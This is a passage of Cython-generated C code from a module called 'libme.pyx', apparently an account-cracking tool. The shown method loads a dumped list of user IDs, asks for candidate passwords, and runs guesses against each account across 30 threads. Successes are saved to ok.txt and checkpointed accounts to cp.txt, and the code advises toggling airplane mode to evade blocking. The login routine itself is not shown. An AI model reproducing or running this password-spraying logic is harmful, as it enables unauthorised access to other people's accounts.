        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 958, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":957
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 * 			for line in open(myfile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except IOError:
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":955
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":959
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except IOError:             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Please Dump File first %s "%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__Fr__rr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 959, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":960
 * 				self.id.append(line.strip())
 * 		except IOError:
 * 			exit("\n [!] Please Dump File first %s "%(myfile))             # <<<<<<<<<<<<<<
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 */
      if (unlikely(!__pyx_v_myfile)) { __Pyx_RaiseUnboundLocalError("myfile"); __PYX_ERR(0, 960, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Please_Dump_File_first_s, __pyx_v_myfile); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 960, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 960, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":955
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":961
 * 		except IOError:
 * 			exit("\n [!] Please Dump File first %s "%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 961, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_ask = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "libme.pyx":962
 * 			exit("\n [!] Please Dump File first %s "%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 962, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":963
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 963, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 963, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 963, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 963, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 963, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 963, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 963, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":964
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_example_separators_44) < 0) __PYX_ERR(0, 964, __pyx_L18_error)

            /* "libme.pyx":965
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 965, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_v_listpass = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":966
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 966, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":967
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 967, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":966
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":968
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 968, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 968, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "libme.pyx":969
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 969, __pyx_L18_error)

            /* "libme.pyx":970
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 970, __pyx_L18_error)

            /* "libme.pyx":971
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 971, __pyx_L18_error)

            /* "libme.pyx":972
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 */
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 972, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
              __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 972, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 972, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 972, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 972, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 972, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 972, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                }
              } else {
                __pyx_t_4 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_4)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 972, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_4);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
              __pyx_t_4 = 0;

              /* "libme.pyx":973
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 973, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 973, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                PyObject* sequence = __pyx_t_4;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 973, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 973, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 973, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 973, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 973, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 973, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":974
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 974, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_f_james); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 974, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 974, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 974, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 974, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 974, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 974, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 974, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":972
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":963
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__Fr__rr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 963, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 963, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 963, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 963, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 963, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
